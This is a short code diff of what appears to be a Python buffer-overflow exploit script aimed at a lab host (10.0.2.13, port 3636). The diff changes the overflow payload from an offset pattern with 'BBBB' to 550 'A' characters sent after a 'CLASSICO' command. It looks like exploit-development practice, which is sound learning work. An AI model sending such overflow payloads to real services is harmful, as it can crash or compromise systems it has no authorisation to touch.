@@ -4,9 +4,7 @@ import socket
 IP="10.0.2.13"                                                                                                                                                                                                                             
 PORTA=3636                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
-payload = "A" * 503                                                                                                                                                                                                                        
-payload += "BBBB"                                                                                                                                                                                                                          
-payload += "D" * 500                                                                                                                                                                                                                       
+payload = "A" * 550                                                                                                                                                                                                                                                                                                                                                                                                                                              
 
 buffer = "CLASSICO "
 buffer += payload
